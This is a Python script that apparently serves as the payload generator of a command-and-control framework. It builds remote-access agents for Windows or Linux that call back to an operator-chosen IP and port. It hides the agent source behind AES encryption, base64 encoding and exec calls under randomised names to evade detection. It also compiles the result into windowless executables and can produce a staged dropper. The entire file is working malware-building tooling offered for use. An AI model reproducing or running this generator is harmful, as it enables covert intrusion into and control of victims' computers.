#!/usr/bin/python3
from Crypto.Cipher import AES
import hashlib
import string
import sys
import random
import base64
import argparse
from os import system
import os
from pwn import log
from subprocess import getoutput
import generate_raw_payload
import generate_dropper

parser = argparse.ArgumentParser(epilog="C2Server payload generator")

parser.add_argument('--windows', action='store_true', help='generate payload for windows')
parser.add_argument('--linux', action='store_true', help='generate payload for linux')
parser.add_argument('--ip','-i', type=str, help='callback IP')
parser.add_argument('--port','-p' ,type=int, help='callback PORT')
parser.add_argument('--compile', action='store_true', help='compiles based on selected OS')
parser.add_argument('--compile-console', action='store_true', help='for binary debug purposes')
parser.add_argument('--raw', action='store_true', help='generate an unobfescated payload ')
parser.add_argument('--staged', action='store_true', help='generate a dropper for payload delivery')
parser.add_argument('--dropper_name',default='dropper.py' , help='dropper file name (default: dropper.py)')
parser.add_argument('--dropper_compile', action='store_true', help='compile the generated dropper based on the selected OS')



args = parser.parse_args()


if args.windows:
	ARCH = 'windows'
if args.linux:
	ARCH = 'linux'


if args.raw:
	print('[*] generating raw payload')
	if args.windows:		
		generate_raw_payload.generate_payload('windows', args.ip, args.port)
		exit()
	if args.linux:		
		generate_raw_payload.generate_payload('linux', args.ip, args.port)
		exit()


if not args.windows and not args.linux:
	exit('[-] must choose an OS: [--window/--linux]')

FILE = []
 

sources_folder = f"{os.path.realpath(os.path.dirname(sys.argv[0]))}/agent_sources"

all_chars = string.ascii_letters + string.digits

random_sampled = random.sample(all_chars, 32)
# password =  str(''.join(random.sample(all_chars, 32)))
key = hashlib.sha256(str(''.join(random_sampled)).encode()).digest()
IV = str(''.join(random.sample(all_chars, 16))).encode()


raw_key = ''.join(random_sampled)
raw_IV = IV.decode('latin1')

if args.windows:
	print('[*] arch: windows')
	f = open(f'{sources_folder}/windows_src.py', 'r').readlines()
	l = [line.strip('\n') for line in f]
if args.linux:
	print('[*] arch: linux')
	f = open(f'{sources_folder}/linux_src.py', 'r').readlines()
	l = [line.strip('\n') for line in f]

print(f'[*] using callback IP: {args.ip}')
print(f'[*] using callback port: {args.port}')

FILE.append(f"IP = '{args.ip}'")
FILE.append(f"PORT = {args.port}")
FILE.append('\n')
for line in l:
	FILE.append(line)

def pad_payload(payload):
	while len(payload) % 16 != 0:
		payload = payload + b"#"
	return payload

def encryptor():

	full_payload = '\n'.join(FILE)
	cipher = AES.new(key, AES.MODE_CBC, IV)

	padded_payload = pad_payload(full_payload.encode())
	print('[*] generated an AES payload')
	return cipher.encrypt(padded_payload)



#---------------------------------------------------#
# print(raw_key)
# print(raw_IV)               for debug purposes
# print('\n')
# print(encryptor())
#---------------------------------------------------#

random_sample_exec = random.sample(all_chars, 7)

exec_name = f"v{str(''.join(random_sample_exec))}"

if args.linux:

	final_payload = f'''
from Crypto.Cipher import AES
import hashlib,string ,paramiko,socket,shlex,os,subprocess,getpass,threading,struct,pickle,zlib,base64,sys,code,binascii,traceback,time,random,re,select,ctypes,platform,logging
from time import sleep
from ftplib import FTP_TLS
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer


{exec_name} = exec
KEY = '{raw_key}'
IV = '{raw_IV}'
 
key = hashlib.sha256(KEY.encode()).digest()
iv = IV.encode()

payload = {encryptor()}
cipher = AES.new(key, AES.MODE_CBC, iv)
{exec_name}(cipher.decrypt(payload).decode())

'''
if args.windows:
	final_payload = f'''
from Crypto.Cipher import AES
import hashlib,string ,paramiko,socket,shlex,os,subprocess,getpass,threading,struct,pickle,zlib,base64,sys,code,binascii,traceback,time,random,re,select,ctypes,platform,logging
from time import sleep
from ftplib import FTP_TLS
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from win32com.client import GetObject
from ctypes import wintypes
from ctypes import windll
from platform import architecture

{exec_name} = exec
KEY = '{raw_key}'
IV = '{raw_IV}'
 
key = hashlib.sha256(KEY.encode()).digest()
iv = IV.encode()

payload = {encryptor()}
cipher = AES.new(key, AES.MODE_CBC, iv)
{exec_name}(cipher.decrypt(payload).decode())

'''	

b64_fullpayload = base64.b64encode(final_payload.encode())

#---------------------------------------------------#
random_sample_1 = random.sample(all_chars, 7)
random_sample_2 = random.sample(all_chars, 7)
# further randomiztion
exec_name2 = f"b{str(''.join(random_sample_1))}"
b64decode_name = f"B{str(''.join(random_sample_2))}"
#-----------------------------------------------------#
if args.linux:

	final_payload = f'''from base64 import b64decode as {b64decode_name}
from Crypto.Cipher import AES
import hashlib
import string 
import paramiko
import socket
import shlex 
import os
import subprocess
import getpass 
import threading 
import struct 
import pickle 
import zlib
import base64
import sys 
import code 
import binascii
import traceback 
import time
import random
import re
import select
import ctypes
import platform
import logging
from time import sleep
from ftplib import FTP_TLS
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

{exec_name2} = exec

{exec_name2}({b64decode_name}({b64_fullpayload}))
'''
if args.windows:
	final_payload = f'''from base64 import b64decode as {b64decode_name}
from Crypto.Cipher import AES
import hashlib
import string 
import paramiko
import socket
import shlex 
import os
import subprocess
import getpass 
import threading 
import struct 
import pickle 
import zlib
import base64
import sys 
import code 
import binascii
import traceback 
import time
import random
import re
import select
import ctypes
import platform
import logging
from time import sleep
from ftplib import FTP_TLS
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from win32com.client import GetObject
from ctypes import wintypes
from ctypes import windll
from platform import architecture
{exec_name2} = exec

{exec_name2}({b64decode_name}({b64_fullpayload}))
'''	

print('[*] generated a base64 encoded payload')

filename = "c2agent.py"

open(filename, 'w').write(final_payload)
print(f'[*] payload written in ({filename})')
if not args.compile:
	print('[*] the generated payload should be compiled with pyinstaller OR py2exe')
	print(f'\n[*] pyinstaller command: pyinstaller --onefile --noconsole {filename}')



if args.compile and args.windows:
	'''
	this function is a system based function if you want to compile python to EXE on linux you must download:

	- wine (apt install wine)
	- mono (apt install mono-complete) if didn't match (apt-cache search mono | grep complete) and download the package appears
	
	then download python.exe (wget https://www.python.org/ftp/python/3.8.9/python-3.8.9.exe) [python3.8 is good when compiling to binaries for stability]
	set it up (wine python-xx.xx.xx.exe)
	find the python exe (find / -name "python.exe" 2>/dev/null)
	install pyinstaller in the windows env (wine /path/to/python.exe -m pip install pyinstaller)
	install the required libraries for the agent in the windows env (wine /path/to/python.exe -m pip install paramiko, pyftpdlib, pycryptodome)
	find the path of pyinstaller.exe (find / -name "pyinstaller.exe" 2>/dev/null)
	edit the path of pyinstaller.exe in the command below
	'''
	print('\n')
	progress = log.progress('')
	progress.status('compiling the generated payload into an EXE...')
	getoutput(f'wine /root/.wine/drive_c/python38/Scripts/pyinstaller.exe --onefile --noconsole {filename}')
	log.info('done')
	system('mv dist/* .')
	system(f"rm -rf build/ dist/ {filename.replace('.py','.spec')}")
	
if args.compile_console and args.windows:
	print('\n')
	progress = log.progress('')
	progress.status('compiling the generated payload with (--console pyinstaller argument) into an EXE...')
	getoutput(f'wine /root/.wine/drive_c/python38/Scripts/pyinstaller.exe --onefile {filename}')
	log.info('done')
	system('mv dist/* .')
	system(f"rm -rf build/ dist/ {filename.replace('.py','.spec')}")
	

if args.compile and args.linux:
	# python3 -m pip install pyinstaller
	print('\n')
	progress = log.progress('')
	progress.status('compiling the generated payload into an ELF...')

	getoutput(f'pyinstaller --onefile --noconsole {filename}')
	system('mv dist/* .')
	system(f"rm -rf build/ dist/ {filename.replace('.py','.spec')}")
	log.info('done')
	

if args.staged:

	if args.dropper_compile:

		COMPILE_DROPPER = "compile"
	else:
		COMPILE_DROPPER = ''


	generate_dropper.dropper(ARCH,args.ip, COMPILE_DROPPER, args.dropper_name)